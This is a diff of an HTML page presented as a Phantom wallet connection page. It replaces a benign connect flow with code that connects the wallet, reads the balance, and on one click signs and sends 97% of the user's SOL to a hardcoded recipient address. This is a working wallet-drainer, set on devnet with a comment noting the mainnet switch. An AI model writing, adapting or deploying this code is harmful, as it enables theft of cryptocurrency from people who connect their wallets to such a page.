@@ -3,89 +3,90 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connect Phantom Wallet</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    #connect-button {
-      padding: 10px 20px;
-      background-color: #1a73e8;
-      color: white;
-      border: none;
-      cursor: pointer;
-      border-radius: 5px;
-    }
-    #connect-button:disabled {
-      background-color: #ccc;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 1.2em;
-    }
-  </style>
+  <title>Phantom Wallet Connection</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
 </head>
 <body>
-  <h1>Connect Your Phantom Wallet</h1>
-  <button id="connect-button" onclick="connectPhantom()" disabled>Connect Wallet</button>
-  <div id="status"></div>
+  <button id="connectButton">Connect Phantom Wallet</button>
+  <p id="balance"></p>
+  <button id="sendButton" style="display: none;">Send 97% SOL</button>
 
   <script>
-    // Function to check if Phantom is installed and enable the connect button
-    function checkPhantomWallet() {
-      const provider = getProvider();
+    const connectButton = document.getElementById("connectButton");
+    const sendButton = document.getElementById("sendButton");
+    const balanceDisplay = document.getElementById("balance");
 
-      if (provider) {
-        document.getElementById('connect-button').disabled = false; // Enable button
-      } else {
-        document.getElementById('status').innerText = "Phantom Wallet is not installed. Please install it from the link below.";
-      }
-    }
+    let provider;
 
-    // Function to get the Phantom provider if it's available
-    function getProvider() {
+    const getProvider = () => {
       if ('phantom' in window) {
-        const provider = window.phantom?.solana;
+        provider = window.phantom.solana;
         if (provider?.isPhantom) {
           return provider;
         }
       }
-      // If Phantom is not installed, redirect to the Phantom website
+      alert("Phantom wallet not installed.");
       window.open('https://phantom.app/', '_blank');
       return null;
-    }
+    };
 
-    // Initialize the Phantom check when the page loads
-    window.addEventListener('load', checkPhantomWallet);
-
-    // Connect to Phantom Wallet
-    async function connectPhantom() {
-      const provider = getProvider();
-      const connectButton = document.getElementById('connect-button');
-      const statusDiv = document.getElementById('status');
-
-      if (!provider) {
-        return; // If Phantom is not installed, do nothing
+    const connectPhantom = async () => {
+      provider = getProvider();
+      if (provider) {
+        try {
+          const response = await provider.connect();
+          console.log("Connected:", response.publicKey.toString());
+          getBalance(response.publicKey.toString());
+        } catch (error) {
+          console.error("Connection failed:", error);
+        }
       }
+    };
+
+    const getBalance = async (publicKey) => {
+      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));  // Use 'mainnet-beta' for mainnet
+      try {
+        const balance = await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
+        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+        balanceDisplay.textContent = `Balance: ${solBalance} SOL`;
+        sendButton.style.display = 'block';
+      } catch (error) {
+        console.error("Error getting balance:", error);
+      }
+    };
+
+    const send97PercentSOL = async () => {
+      if (!provider) return;
+      const publicKey = provider.publicKey;
+      const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));  // Use 'mainnet-beta' for mainnet
+
+      const balance = await connection.getBalance(publicKey);
+      const totalLamports = balance;
+      const sendLamports = totalLamports * 0.97;  // Send 97% of balance
+
+      // Define the recipient's address
+      const recipientAddress = "A647hLQ8eZe3qLHzgxGjp1qC9ydL1xVTh7uV2bigsA26";
+
+      const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: new solanaWeb3.PublicKey(recipientAddress),
+          lamports: sendLamports - 5000, // Subtract small fee for the transaction
+        })
+      );
 
       try {
-        // Request connection to Phantom wallet
-        const response = await provider.connect();
-
-        console.log('Connected to Phantom wallet:', response);
-
-        // Display the connected account information
-        statusDiv.innerHTML = `Connected with account: <strong>${response.publicKey.toString()}</strong>`;
-
-        // Disable the button after successful connection
-        connectButton.disabled = true;
-      } catch (err) {
-        console.error('Error connecting to Phantom:', err);
-        statusDiv.innerText = "Failed to connect. Please try again.";
+        const signedTransaction = await provider.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+        await connection.confirmTransaction(txid, 'processed');
+        alert('Transaction successful!');
+      } catch (error) {
+        console.error("Transaction failed:", error);
       }
-    }
+    };
+
+    connectButton.addEventListener('click', connectPhantom);
+    sendButton.addEventListener('click', send97PercentSOL);
   </script>
 </body>
 </html>
